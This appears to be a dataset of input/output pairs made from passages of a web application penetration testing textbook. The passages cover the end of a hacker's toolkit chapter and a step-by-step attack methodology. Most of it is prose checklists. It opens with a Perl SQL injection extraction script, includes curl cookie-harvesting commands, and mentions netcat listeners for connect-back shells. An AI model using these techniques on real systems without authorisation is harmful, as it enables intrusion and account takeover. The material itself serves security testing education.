$test))--”;\n# POST to the vulnerable url\nmy $req = POST “http://wahh-app.com/login.asp”,\n[login_username => “foo”, login_password => $payload,];\nmy $resp = $ua->request($req);\nmy $content = $resp->as_string;\nif ($content =~ /nvarchar value ‘(.*)’/)\n{\nprint “$1\\n”; # print the extracted match\n}\nelse {exit};\n# adjust the next attack to get next highest value\n$test = “where $col < ‘$1’”;\n}\nIn addition to built-in commands and libraries, there are various simple\ntools and utilities that you can call out to from Perl scripts and operating sys-\ntem shell scripts. Some tools that are useful for this purpose are described here.\nWget\nWget is a handy tool for retrieving a specified URL using HTTP or HTTPS. It\ncan support a downstream proxy, HTTP authentication, and various other\nconfiguration options.\nCurl\nCurl is one of the most flexible command-line tools for issuing HTTP and\nHTTPS requests. It supports GETand POSTmethods, request parameters, client\nSSL certificates and HTTP authentication. In the following example, the -c\noption is used to save the cookies returned by a particular request. This could\nbe used repeatedly to harvest a large number of session tokens for further\nanalysis.\nC:\\bin>curl -c cookies.txt -d “login_name=marcus&login_password=marcus1”\nhttp://192.168.179.195/injection/Processlogin1.asp\n<head><title>Object moved</title></head>\n<body><h1>Object Moved</h1>This object may be found <a\nHREF=””>here</a>.</body>\n70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 663\nChapter 19 ■ A Web Application Hacker’s Toolkit 663\nC:\\bin>more cookies.txt\n# Netscape HTTP Cookie File\n# http://www.netscape.com/newsref/std/cookie_spec.html\n# This file was generated by libcurl! Edit at your own risk.\n192.168.179.195 FALSE / FALSE 0 auth 15423765322\n192.168.179.195 FALSE / FALSE 0 ASPSESSIONIDQAACDQST\nFCBGCMJCDGMDGDPNPIHDPFBF\nNetcat\nNetcat is a very versatile tool that can be used to perform numerous network-\nrelated tasks, and is a cornerstone of many beginners’ hacking tutorials. You\ncan use it to open a TCP connection to a server, send a request, and retrieve the\nresponse. In addition to this use, netcat can be used to create a network listener\non your computer, to receive connections back from a server you are attacking.\nSee Chapter 9 for an example of this technique being used to create an out-of-\nband channel in a database attack.\nNetcat does not itself support SSL connections, but this can be achieved by\nusing it in combination with the stunnel tool described next.\nStunnel\nStunnel is very useful when you are working with your own scripts or other\ntools that do not themselves support HTTPS connections. Stunnel enables you\nto create client SSL connections to any host, or server SSL sockets to listen for\nincoming connections from any client. Because HTTPS is simply the HTTP\nprotocol tunneled over SSL, you can use stunnel to provide HTTPS capabilities\nto any other tool.\nFor example, the following command shows stunnel being configured to\ncreate a simple TCP server socket on port 88 of the local loopback interface,\nand when a connection is received, to perform an SSL negotiation with the\nserver at wahh-app.com, forwarding the incoming clear-text connection\nthrough the SSL tunnel to this server:\nC:\\bin>stunnel -c -d localhost:88 -r wahh-app.com:443\n2007.01.08 15:33:14 LOG5[1288:924]: Using ‘wahh-app.com.443’ as\ntcpwrapper service name\n2007.01.08 15:33:14 LOG5[1288:924]: stunnel 3.20 on x86-pc-mingw32-gnu\nWIN32"
  },
  {
    "input": "Chapter Summary",
    "output": "70779c19.qxd:WileyRed 9/14/07 3:15 PM Page 664\n664 Chapter 19 ■ A Web Application Hacker’s Toolkit\nYou can now simply point any tool that is not SSL-capable at port 88 on the\nloopback interface, and this will effectively communicate with the destination\nserver over HTTPS, as follows:\n2007.01.08 15:33:20 LOG5[1288:1000]: wahh-app.com.443 connected from\n127.0.0.1:1113\n2007.01.08 15:33:26 LOG5[1288:1000]: Connection closed: 16 bytes sent to\nSSL, 39\n2 bytes sent to socket\nChapter Summary\nThroughout this book, our focus has been on the practical techniques that you\ncan use to attack web applications. Although you can carry out some of these\ntasks using only a browser, to perform an effective and comprehensive attack\nof an application, you will need some tools to assist you.\nThe most important and indispensable tool in your arsenal is the intercept-\ning proxy, which enables you to view and modify all traffic passing in both\ndirections between browser and server. Today’s proxies are supplemented\nwith a wealth of other integrated tools that can help automate many of the\ntasks you will need to perform. In addition to one of these tool suites, you will\nneed to use one or more browser extensions that enable you to continue work-\ning in situations where a proxy cannot be used.\nThe main other type of tool that you may employ is a web application scan-\nner. These tools can be effective at quickly discovering a range of common vul-\nnerabilities, and they can also help you to map and analyze an application’s\nfunctionality. However, there are many kinds of security flaws that they are\nunable to identify, and they can never be relied upon to give a completely\nclean bill of health to any application.\nUltimately, what will make you an accomplished web application hacker is\nyour ability to understand how web applications function, where their\ndefenses break down, and how to probe them for exploitable vulnerabilities.\nTo do this effectively, you need tools that enable you to see right under the\nhood, to manipulate your interaction with applications in a fine-grained way,\nand to leverage automation wherever possible to make your attacks faster and\nmore reliable. Whichever tools you find most useful in achieving these objec-\ntives, these are the right ones for you. And if the tools on offer do not meet\nyour needs, you can always create your own. It isn’t that difficult, honest."
  },
  {
    "input": "Chapter 20: A Web Application Hacker’s Methodology",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 665\nCHAPTER\n20\nA Web Application\nHacker’s Methodology\nThis chapter contains a detailed step-by-step methodology that you can follow\nwhen attacking a web application. It covers all of the categories of vulnerabil-\nity and attack techniques described in this book. Carrying out all of the steps\nin this methodology will not guarantee that you discover all of the vulnerabil-\nities within a given application. However, it will provide you with a good level\nof assurance that you have probed all of the necessary regions of the applica-\ntion’s attack surface, and have found as many issues as possible given the\nresources available to you.\nFigure20-1 illustrates the main areas of work that this methodology describes.\nWithin each area, we will drill down into this diagram and illustrate the subdi-\nvision of tasks which that area involves. The numbers used in the diagrams cor-\nrespond to the hierarchical numbered list used in the methodology, so you can\neasily jump to the actions involved in a specific area.\nThe methodology is presented as a sequence of tasks that are organized and\nordered according to the logical interdependencies between them. As far as\npossible, these interdependencies are highlighted in the task descriptions.\nHowever, in practice you will frequently need to think imaginatively about the\ndirection that your activities should take, and allow these to be guided by\nwhat you discover about the application you are attacking. For example:\n■■ Information gathered in one stage may enable you to return to an ear-\nlier stage and formulate more focused attacks. For example, an access\n665\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 666\n666 Chapter 20 ■ A Web Application Hacker’s Methodology\ncontrol bug that enables you to obtain a listing of all users may enable\nyou to perform a more effective password guessing attack against the\nauthentication function.\n■■ Discovering a key vulnerability in one area of the application may\nenable you to shortcut some of the work in other areas. For example, a\nfile disclosure vulnerability may enable to you perform a code review\nof key application functions rather than probing them in a solely black-\nbox manner.\n■■ The results of your testing in some areas may highlight patterns of\nrecurring vulnerabilities that you can immediately probe for in other\nareas. For example, a generic defect in the application’s input validation\nfilters may enable you to quickly find a bypass of its defenses against\nseveral different categories of attack.\nRecon and analysis\n1. Map application content\n2. Analyze the application\nApplication logic Access handling Input handling Application hosting\n3. Test client-side 4. Test 7. Fuzz all 10. Test for shared\ncontrols authentication parameters hosting issues\n8. Test for issues\n9. Test for logic 5. Test session 11. Test the web\nwith specific\nflaws management server\nfunctionality\n6. Test access\ncontrols\n12. Miscellaneous\nchecks\nFigure20-1: The main areas of work involved in the methodology"
  },
  {
    "input": "General Guidelines",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 667\nChapter 20 ■ A Web Application Hacker’s Methodology 667\nUse the steps in this methodology to guide your work, and as a checklist to\navoid oversights, but do not feel obliged to adhere to them too rigidly. Keep\nthe following thought in mind: the tasks we describe are largely standard and\northodox; the most impressive attacks against web applications always\ninvolve thinking beyond them.\nGeneral Guidelines\nThere are some general considerations which you should always keep in mind\nwhen carrying out the detailed tasks involved in attacking a web application.\nThese may apply to all of the different areas you need to examine, and tech-\nniques you need to carry out.\n■■ Remember that several characters have special meaning in different\nparts of the HTTP request. When you are modifying the data within\nrequests, you should URL-encode these characters to ensure that they\nare interpreted in the way you intend:\n■■ &is used to separate parameters in the URL query string and message\nbody. To insert a literal &character, you should encode this as %26.\n■■ =is used to separate the name and value of each parameter in the\nURL query string and message body. To insert a literal =character,\nyou should encode this as %3d.\n■■ ?is used to mark the beginning of the URL query string. To insert a\nliteral ?character, you should encode this as %3f.\n■■ A space is used to mark the end of the URL in the first line of\nrequests, and can indicate the end of a cookie value in the Cookie\nheader. To insert a literal space you should encode this as %20or +.\n■■ Because +represents an encoded space, to insert a literal +character,\nyou should encode this as %2b.\n■■ ;is used to separate individual cookies in the Cookieheader. To\ninsert a literal ;character, you should encode this as %3b.\n■■ #is used to mark the fragment identifier within the URL. If you\nenter this character into the URL within your browser, it will effec-\ntively truncate the URL that is sent to the server. To insert a literal #\ncharacter, you should encode this as %23.\n■■ %is used as the prefix in the URL-encoding scheme. To insert a lit-\neral %character, you should encode this as %25.\n■■ Any nonprinting characters such as null bytes and newlines must, of\ncourse, be URL-encoded using their ASCII character code—in this\ncase, as %00and %0a, respectively.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 668\n668 Chapter 20 ■ A Web Application Hacker’s Methodology\n■■ Many tests for common web application vulnerabilities involve\nsending various crafted input strings, and monitoring the application’s\nresponses for anomalies, which indicate that a vulnerability is present.\nIn some cases, the application’s response to a particular request will\ncontain a signature of a particular vulnerability regardless of whether a\ntrigger for that vulnerability has been submitted. In any case where spe-\ncific crafted input results in behavior associated with a vulnerability\n(such as a particular error message), you should double-check whether\nsubmitting benign input in the relevant parameter also causes the same\nbehavior. If it does so, then your tentative finding is probably a false\npositive.\n■■ Applications typically accumulate an amount of state from previous\nrequests, which affects how they respond to further requests. Some-\ntimes, when you are trying to investigate a tentative vulnerability, and\nisolate the precise cause of a particular piece of anomalous behavior, it\nis necessary to remove the effects of any accumulated state. To do this,\nit is usually sufficient to begin a fresh session with a new browser\nprocess, navigate to the location of the observed anomaly using only\nbenign requests, and then resubmit your crafted input. You can often\nreplicate this measure by adjusting the parts of your requests contain-\ning cookies and caching information. Further, you can use a tool like\nBurp Repeater to isolate a request, make specific adjustments to it, and\nreissue it as many times as you require.\n■■ Some applications use a load-balanced configuration in which consecu-\ntive HTTP requests may be handled by different back-end servers, at\nthe web, presentation, data, or other tiers. Different servers may have\nsmall differences in configuration that affect your results. Further, some\nsuccessful attacks will result in a change in the state of the specific\nserver that handles your requests—such as the injection of a new\nstored procedure into the database or the creation of a new file within\nthe web root. To isolate the effects of particular actions, it may be neces-\nsary to perform several identical requests in succession, testing the\nresult of each until your request is handled by the relevant server.\nAssuming that you are implementing this methodology as part of a consul-\ntancy engagement, you should always be sure to carry out the usual scoping\nexercise, to agree precisely which hostnames, URLs, and functionality are to be\nincluded, and whether any restrictions exist on the types of testing you are\npermitted to perform. You should make the application owner aware of the\ninherent risks involved in performing any kind of penetration testing against\na black-box target, and advise them to carry out a backup of any important\ndata before you commence your work."
  },
  {
    "input": "1. Map the Application’s Content",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 669\nChapter 20 ■ A Web Application Hacker’s Methodology 669\n1. Map the Application’s Content\nLinked content Other content Non-standard\naccess methods\n1.1. Explore visible 1.3. Discover hidden 1.5. Identifier-\ncontent content specified functions\n1.2. Consult public\n1.4. Discover default 1.6. Debug\nresources\ncontent parameters\nFigure20-2: Mapping the application’s content\n1.1. Explore Visible Content\n1.1.1. Configure your browser to use your favorite integrated proxy/spi-\ndering tool. Both Burp and WebScarab can be used to passively spi-\nder the site by monitoring and parsing web content processed by the\nproxy.\n1.1.2. If you find it useful, configure your browser to use an extension such\nas IEWatch, to monitor and analyze the HTTP and HTML content\nbeing processed by the browser.\n1.1.3. Browse the entire application in the normal way, visiting every link\nand URL, submitting every form, and proceeding through all multi-\nstep functions to completion. Try browsing with JavaScript enabled\nand disabled, and with cookies enabled and disabled. Many applica-\ntions can handle various browser configurations, and you may reach\ndifferent content and code paths within the application.\n1.1.4. If the application uses authentication, and you have or can create a\nlogin account, use this to access the protected functionality.\n1.1.5. As you browse, monitor the requests and responses passing through\nyour intercepting proxy, to gain an understanding of the kinds of\ndata being submitted and the ways in which the client is used to con-\ntrol the behavior of the server-side application.\n1.1.6. Review the site map generated by the passive spidering, and identify\nany content or functionality that you have not walked through using\nyour browser. From the spider results, establish where each item was\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 670\n670 Chapter 20 ■ A Web Application Hacker’s Methodology\ndiscovered (for example, in Burp Spider, check the Linked From\ndetails). Access each item using your browser, so that the response\nfrom the server is parsed by the spider to identify any further con-\ntent. Continue this step recursively until no further content or func-\ntionality is identified.\n1.1.7. When you have finished manually browsing and passively spider-\ning, you can use your spider to actively crawl the application, using\nthe set of discovered URLs as seeds. This may sometimes uncover\nadditional content that you have overlooked when working manu-\nally. Before doing an automated crawl, first identify any URLs that\nare dangerous or likely to break the application session, and config-\nure the spider to exclude these from its scope.\n1.2. Consult Public Resources\n1.2.1. Use Internet search engines and archives (for example, the Wayback\nMachine) to identify what content they have indexed and stored for\nyour target application.\n1.2.2. Use advanced search options to improve the effectiveness of your\nresearch. For example, on Google you can use site:to retrieve all of\nthe content for your target site, and link:to retrieve other sites that\nlink to it. If your search identifies content that is no longer present in\nthe live application, you may still be able to view this from the search\nengine’s cache. This old content may contain links to additional\nresources that have not yet been removed.\n1.2.3. Perform searches on any names and email addresses you have dis-\ncovered within the application’s content, such as contact information,\nincluding items not rendered on-screen, such as HTML comments. In\naddition to web searches, also perform news and groups searches.\nLook for any technical details posted to Internet forums regarding\nthe target application and its supporting infrastructure.\n1.3. Discover Hidden Content\n1.3.1. Confirm how the application handles requests for nonexistent items.\nMake some manual requests for known valid and invalid resources,\nand compare the server’s responses to establish an easy means of\nidentifying when an item does not exist.\n1.3.2. Obtain listings of common file and directory names, and common\nfile extensions. Add to these lists all the items actually observed\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 671\nChapter 20 ■ A Web Application Hacker’s Methodology 671\nwithin the applications, and also items inferred from these. Try\nto understand the naming conventions used by application devel -\nopers. For example, if there are pages called AddDocument.jsp\nand ViewDocument.jsp, then there may also be pages called\nEditDocument.jspand RemoveDocument.jsp.\n1.3.3. Review all client-side code to identify any clues about hidden server-\nside content, including HTML comments and disabled form elements.\n1.3.4. Using the automation techniques described in Chapter 13, make\nlarge numbers of requests based on your directory, filename, and file\nextension lists. Monitor the server’s responses to confirm which\nitems are present and accessible.\n1.3.5. Perform these content-discovery exercises recursively, using new\nenumerated content and patterns as the basis for further user-\ndirected spidering, and further automated discovery.\n1.4. Discover Default Content\n1.4.1. Run Nikto against the web server to detect any default or well-\nknown content that is present. Use Nikto’s options to maximize its\neffectiveness—for example, the –rootoption to specify a directory\nto check for default content, or -404to specify a string that identifies\na custom File Not Found page.\n1.4.2. Verify any potentially interesting findings manually to eliminate any\nfalse positives within the results.\n1.5. Enumerate Identifier-Specified Functions\n1.5.1. Identify any instances where specific application functions are\naccessed by passing an identifier of the function in a request\nparameter (for example, /admin.jsp?action=editUseror\n/main.php?func=A21).\n1.5.2. Apply the content discovery techniques used in step 1.3 to the mech-\nanism being used to access individual functions. For example, if the\napplication uses a parameter containing a function name, first deter-\nmine its behavior when an invalid function is specified, and try to\nestablish an easy means of identifying when a valid function has\nbeen requested. Compile a list of common function names or cycle\nthrough the syntactic range of identifiers observed to be in use. Auto-\nmate the exercise to enumerate valid functionality as quickly and\neasily as possible."
  },
  {
    "input": "2. Analyze the Application",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 672\n672 Chapter 20 ■ A Web Application Hacker’s Methodology\n1.5.3. If applicable, compile a map of application content based on func-\ntional paths, rather than URLs, showing all of the enumerated func-\ntions and the logical paths and dependencies between them. (See\nChapter 4 for an example of this.)\n1.6. Test for Debug Parameters\n1.6.1. Choose one or more application pages or functions where hidden\ndebug parameters (such as debug=true) may be implemented. These\nare most likely to appear in key functionality such as login, search,\nand file upload or download.\n1.6.2. Use listings of common debug parameter names (such as debug,\ntest, hide, and source) and common values (such as true, yes, on,\nand 1), and iterate through all permutations of these, submitting each\nname/value pair to each targeted function. For POSTrequests, supply\nthe parameter both in the URL query string and the request body.\nUse the techniques described in Chapter 13 to automate this exercise.\nFor example, you can use the cluster bomb attack type in Burp\nIntruder to combine all permutations of two payload lists.\n1.6.3. Review the application’s responses for any anomalies that may indi-\ncate that the added parameter has had an effect on the application’s\nprocessing.\n2. Analyze the Application\n2.1. Identify 2.2. Identify data 2.3. Identify\nfunctionality entry points technologies\n2.4. Map the attack surface\nFigure20-3: Analyzing the application\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 673\nChapter 20 ■ A Web Application Hacker’s Methodology 673\n2.1. Identify Functionality\n2.1.1. Identify the core functionality that the application was created for\nand the actions that each function is designed to perform when used\nas intended.\n2.1.2. Identify the core security mechanisms employed by the application\nand the ways they work. In particular, understand the key mecha-\nnisms that handle authentication, session management, and access\ncontrol, and the functions that support them, such as user registra-\ntion and account recovery.\n2.1.3. Identify all of the more peripheral functions and behavior, such as\nthe use of redirects, off-site links, error messages, and administrative\nand logging functions.\n2.2. Identify Data Entry Points\n2.2.1. Identify all of the different entry points that exist for introducing user\ninput into the application’s processing, including URLs, query string\nparameters, POSTdata, cookies, and other HTTP headers processed\nby the application.\n2.2.2. Examine any customized data transmission or encoding mechanisms\nused by the application, such as a nonstandard query string format.\nUnderstand whether the data being submitted encapsulates parame-\nter names and values, or whether an alternative means of representa-\ntion is being used.\n2.2.3. Identify any out-of-band channels via which user-controllable or\nother third-party data is being introduced into the application’s pro-\ncessing—for example, a web mail application that processes and\nrenders messages received via SMTP.\n2.3. Identify the Technologies Used\n2.3.1. Identify each of the different technologies used on the client side,\nsuch as forms, scripts, cookies, Java applets, ActiveX controls, and\nFlash objects.\n2.3.2. As far as possible, establish which technologies are being used on the\nserver side, including scripting languages, application platforms, and\ninteraction with back-end components such as databases and email\nsystems.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 674\n674 Chapter 20 ■ A Web Application Hacker’s Methodology\n2.3.3. Check the HTTP Serverheader returned in application responses,\nand also for any other software identifiers contained within custom\nHTTP headers or HTML source code comments. Note that in some\ncases, different areas of the application are handled by different back-\nend components, so different banners may be received.\n2.3.4. Run the Httprint tool to fingerprint the web server.\n2.3.5. Review the results of your content-mapping exercises to identify any\ninteresting-looking file extensions, directories, or other URL subse-\nquences that may provide clues about the technologies in use on the\nserver. Review the names of any session tokens and other cookies\nissued. Use Google to search for technologies associated with these\nitems.\n2.3.6. Identify any interesting-looking script names and query string para-\nmeters that may belong to third-party code components. Search for\nthese on Google using the inurl:qualifier to find any other applica-\ntions using the same scripts and parameters, and which therefore\nmay be using the same third-party components. Perform a noninva-\nsive review of these sites, as this may uncover additional content and\nfunctionality that is not explicitly linked on the application you are\nattacking.\n2.4. Map the Attack Surface\n2.4.1. Try to ascertain the likely internal structure and functionality of the\nserver-side application and the mechanisms that it uses behind the\nscenes to deliver the behavior that is visible from the client perspec-\ntive. For example, a function to retrieve customer orders is likely to\nbe interacting with a database.\n2.4.2. For each item of functionality, identify the kinds of common vulnera-\nbilities that are often associated with it. For example, file upload\nfunctions may be vulnerable to path traversal; interuser messaging\nmay be vulnerable to XSS; and Contact Us functions may be vulnera-\nble to SMTP injection. See Chapter 4 for examples of vulnerabilities\ncommonly associated with particular functions and technologies.\n2.4.3. Formulate a plan of attack, prioritizing the most interesting-\nlooking functionality and the most serious of the potential vulnera-\nbilities associated with it. Use your plan to guide the amount of time\nand effort that you devote to each of the remaining areas of this\nmethodology."
  },
  {
    "input": "3. Test Client-Side Controls",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 675\nChapter 20 ■ A Web Application Hacker’s Methodology 675\n3. Test Client-Side Controls\n3.1. Transmission of 3.2 Client-side input 3.3. Thick client\ndata via client controls components\nHidden fields Length limits Java applets\nCookies JavaScript validation ActiveX controls\nPreset parameters Disabled elements Shockwave Flash\nASP.NET ViewState\nFigure20-4: Testing client-side controls\n3.1. Test Transmission of Data via the Client\n3.1.1. Locate all instances within the application where hidden form fields,\ncookies, and URL parameters are apparently being used to transmit\ndata via the client.\n3.1.2. Attempt to determine the purpose that the item plays in the applica-\ntion’s logic, based on the context in which it appears and on its name\nand value.\n3.1.3. Modify the item’s value in ways that are relevant to its role in the\napplication’s functionality. Determine whether arbitrary values sub-\nmitted in the field are processed by the application, and whether this\ncan be exploited to interfere with its logic or subvert any security\ncontrols.\n3.1.4. If the application transmits opaque data via the client, you can attack\nthis in various ways. If the item is obfuscated, you may be able to\ndecipher the obfuscation algorithm, and so submit arbitrary data\nwithin the opaque item. Even if it is securely encrypted, you may be\nable to replay the item in other contexts to interfere with the applica-\ntion’s logic. See Chapter 5 for more details of these and other attacks.\n3.1.5. If the application uses the ASP.NET ViewState, test to confirm\nwhether this can be tampered with or contains any sensitive informa-\ntion. Note that the ViewState may be used differently on different\napplication pages.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 676\n676 Chapter 20 ■ A Web Application Hacker’s Methodology\n3.1.5.1. Use the ViewState analyzer in Burp Suite to confirm whether the\nEnableViewStateMacoption has been enabled, meaning that the\nViewState’s contents cannot be modified.\n3.1.5.2. Review the decoded ViewState to identify any sensitive data it\ncontains.\n3.1.5.3. Modify one of the decoded parameter values and reencode and sub-\nmit the ViewState. If the application accepts the modified value, then\nyou should treat the ViewState as an input channel for introducing\narbitrary data into the application’s processing, and perform the\nsame testing on the data it contains as you would for any other\nrequest parameters.\n3.2. Test Client-Side Controls over User Input\n3.2.1. Identify any cases where client-side controls such as length limits\nand JavaScript checks are used to validate user input before it is sub-\nmitted to the server. These controls can of course be trivially\nbypassed because you can send arbitrary requests to the server. For\nexample:\n<form action=\"order.asp\" onsubmit=\"return Validate(this)\">\n<input maxlength=\"3\" name=\"quantity\">\n...\n3.2.2. Test each affected input field in turn by submitting input that would\nordinarily be blocked by the client-side controls, to verify whether\nthese are replicated on the server.\n3.2.3. The ability to bypass client-side validation does not necessarily rep-\nresent any vulnerability. Nevertheless, you should review closely\nwhat validation is being performed, and confirm whether the appli-\ncation is relying upon the client-side controls to protect itself from\nmalformed input, and whether any exploitable conditions exist that\ncan be triggered by such input.\n3.2.4. Review each HTML form to identify any disabled elements, such as\ngrayed-out submit buttons, for example:\n<input disabled=\"true\" name=\"product\">\nIf any are found, submit these to the server along with the form’s\nother parameters, and confirm whether the parameter has any effect\non the server’s processing that you can leverage in an attack.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 677\nChapter 20 ■ A Web Application Hacker’s Methodology 677\n3.3. Test Thick-Client Components\n3.3.1. Test Java Applets\n3.3.1.1. Identify any Java applets employed by the application. Look for any\n.classor .jarfile types being requested via your intercepting\nproxy, or look for applet tags within the HTML source code of appli-\ncation pages. For example:\n<applet code=\"input.class\" id=\"TheApplet\" codebase=\"/scripts/\">\n</applet>\n3.3.1.2. Review all calls made to the applet’s methods from within the invok-\ning HTML, and determine whether data returned from the applet is\nbeing submitted to the server. If this data is opaque (that is, obfus-\ncated or encrypted), then to modify it you will probably need to\ndecompile the applet to obtain its source code.\n3.3.1.3. Download the applet bytecode by typing the URL into your browser,\nand save the file locally. The name of the bytecode file is specified in\nthe codeattribute of the applet tag, and the file will be located in the\ndirectory specified in the codebaseattribute if this is present; other-\nwise, it will be located in the same directory as the page in which the\napplet tag appears.\n3.3.1.4. Use a suitable tool such as Jad or Jode to decompile the bytecode into\nJava source code. For example:\nC:\\>jad.exe input.class\nParsing input.class... Generating input.jad\nIf the applet is packaged into a JAR file, you can unpack this to\nretrieve the .classfiles using standard archive readers such as Win-\nRar or WinZip.\n3.3.1.5. Review the relevant source code (starting with the implementation of\nthe method that returns the opaque data) to understand what pro-\ncessing is being performed.\n3.3.1.6. Determine whether the applet contains any public methods that can\nbe used to perform the relevant obfuscation on arbitrary input.\n3.3.1.7. If not, modify the applet’s source in such a way as to neutralize any\nvalidation it performs, or to allow you to obfuscate arbitrary input.\nYou can then recompile the source into a .classfile, using the javac\ntool, which is part of Sun’s Java Development Kit.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 678\n678 Chapter 20 ■ A Web Application Hacker’s Methodology\n3.3.2. Test ActiveX controls\n3.3.2.1. Identify any ActiveX controls employed by the application. Look for\nany .cabfile types being requested via your intercepting proxy, or\nlook for object tags within the HTML source code of application\npages. For example:\n<OBJECT\nclassid=\"CLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA\"\ncodebase=\"https://wahh app.com/scripts/input.cab\"\nid=\"TheAxControl\">\n</OBJECT>\n3.3.2.2. It is usually possible to subvert any input validation performed\nwithin an ActiveX control by attaching a debugger to the process and\ndirectly modifying data being processed or altering the program’s\nexecution path. See Chapter 5 for more details about this kind of\nattack.\n3.3.2.3. It is often possible to guess the purpose of different methods that an\nActiveX control exports based on their names and the parameters\npassed to them. Use the COMRaider tool to enumerate the methods\nexported by the control. Test whether any of these can be manipu-\nlated to affect the behavior of the control and defeat any validation\ntests implemented by it.\n3.3.2.4. If the purpose of the control is to gather or verify certain information\nabout the client computer, use the Filemon and Regmon tools to\nmonitor the information being gathered by the control. It is often\npossible to create suitable items within the system registry and file\nsystem to fix the inputs used by the control and so affect its behavior.\n3.3.2.5. Test any ActiveX controls for vulnerabilities that could be exploited\nto attack other users of the application. You can modify the HTML\nused to invoke a control to pass arbitrary data to its methods and\nmonitor the results. Look for methods with dangerous sounding\nnames, such as LaunchExe. You can also use COMRaider to perform\nsome basic fuzz testing of ActiveX controls to identify flaws such as\nbuffer overflows.\n3.3.3. Test Shockwave Flash objects\n3.3.3.1. Explore the functionality of the Flash object within your browser.\nMonitor your intercepting proxy for any requests made to the server,\nand establish which actions are executed entirely within the client-\nside component and which involve some server-side processing."
  },
  {
    "input": "4. Test the Authentication Mechanism",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 679\nChapter 20 ■ A Web Application Hacker’s Methodology 679\n3.3.3.2. Any time you see data being submitted to the server, determine\nwhether this is transparent in nature or has been obfuscated or\nencrypted in some way. If it’s the latter, then to modify it you will\nprobably need to disassemble or decompile the Flash object.\n3.3.3.3. Use the Flasm tool to disassemble the object into human-readable\nbytecode, or the Flare tool to decompile it into ActionScript source\ncode. As described for Java applets, review the code to identify any\nattack points that will enable you to reengineer the Flash object and\nbypass the controls implemented within it. You can use the same\ntools to recompile the modified code back into a Flash object.\n4. Test the Authentication Mechanism\n4.1. Understand the mechanism\nDirect attacks Special functions Credential handling Authentication logic\n4.2. Test password 4.5. Test account 4.8. Test username 4.12.1 Test for fail-\nquality recovery uniqueness open logic\n4.3. Test for 4.12.2. Test\n4.6. Test “remember 4.9. Test credential\nusername multistage\nme” predictability\nenumeration processes\n4.7. Test\n4.4. Test for 4.10. Check for\nimpersonation\npassword guessing unsafe transmission\nfunctions\n4.11. Check for\nunsafe distribution\n4.13. Exploit vulnerabilities\nFigure20-5: Testing the authentication mechanism\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 680\n680 Chapter 20 ■ A Web Application Hacker’s Methodology\n4.1. Understand the Mechanism\n4.1.1. Establish the authentication technologies in use (for example, forms,\ncertificates, or multi-factor).\n4.1.2. Locate all of the authentication-related functionality (including login,\nregistration, account recovery, and so on).\n4.1.3. If the application does not implement an automated self-registration\nmechanism, determine whether any other means exists of obtaining\nseveral user accounts.\n4.2. Test Password Quality\n4.2.1. Review the application for any description of the minimum quality\nrules enforced on user passwords.\n4.2.2. Attempt to set various kinds of weak passwords, using any self-\nregistration or password change functions, to establish the rules\nactually enforced. Try short passwords, alphabetical characters\nonly, single-case characters only, dictionary words, and the current\nusername.\n4.2.3. Test for incomplete validation of credentials. Set a strong and com-\nplex password (for example, 12 characters with mixed-case letters,\nnumerals, and typographical characters). Attempt to log in with dif-\nferent variations on this password, by removing the last character,\nchanging the case of a character, and removing any special charac-\nters. If any of these login attempts is successful, continue experiment-\ning systematically to identify what validation is actually being\nperformed.\n4.2.4. Having established the minimum password quality rules, and the\nextent of password validation, identify the range of values that a\npassword-guessing attack would need to employ to have a good\nprobability of success.\n4.3. Test for Username Enumeration\n4.3.1. Identify every location within the various authentication functions\nwhere a username is submitted, including via an on-screen input\nfield, a hidden form field, or a cookie. Common locations include the\nprimary login, self-registration, password change, logout, and\naccount recovery.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 681\nChapter 20 ■ A Web Application Hacker’s Methodology 681\n4.3.2. For each location, submit two requests, containing a valid and an\ninvalid username. Review every detail of the server’s responses to\neach pair of requests, including the HTTP status code, any redirects,\ninformation displayed on screen, any differences hidden away in the\nHTML page source, and the time taken for the server to respond.\nNote that some differences may be extremely subtle (for example,\napparently the same error message may contain minor typographical\ndifferences). You can use the history function of your intercepting\nproxy to review all traffic to and from the server. WebScarab has a\nfunction to compare two responses to quickly highlight any differ-\nences between them.\n4.3.3. If any differences are observed between the responses where a valid\nand invalid username are submitted, repeat the test with a different\npair of values and confirm that a systematic difference exists that can\nprovide a basis for automated username enumeration.\n4.3.4. Check for any other sources of information leakage within the appli-\ncation that may enable you to compile a list of valid usernames—for\nexample, logging functionality, actual listings of registered users, and\ndirect mention of names or email addresses in source code comments.\n4.4. Test Resilience to Password Guessing\n4.4.1. Identify every location within the application where user credentials\nare submitted. The two main instances are typically the main login\nfunction and the password change function. The latter is normally a\nvalid target for password guessing attacks only if an arbitrary user-\nname can be supplied.\n4.4.2. At each location, using an account that you control, manually send\nseveral requests containing the valid username but invalid other cre-\ndentials. Monitor the application’s responses to identify any differ-\nences. After around 10 failed logins, if the application has not\nreturned any message about account lockout, submit a request con-\ntaining valid credentials. If this request succeeds, there is probably\nno account lockout policy in force.\n4.4.3. If you do not control any accounts, attempt to enumerate or guess a\nvalid username, and make several invalid requests using this, moni-\ntoring for any error messages about account lockout. Of course, you\nshould be aware that this test may have the effect of suspending or\ndisabling an account belonging to another user.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 682\n682 Chapter 20 ■ A Web Application Hacker’s Methodology\n4.5. Test Any Account Recovery Function\n4.5.1. Identify whether the application contains any facility for users to\nregain control of their account if they have forgotten their creden-\ntials. This is often indicated by a Forgotten Your Password link 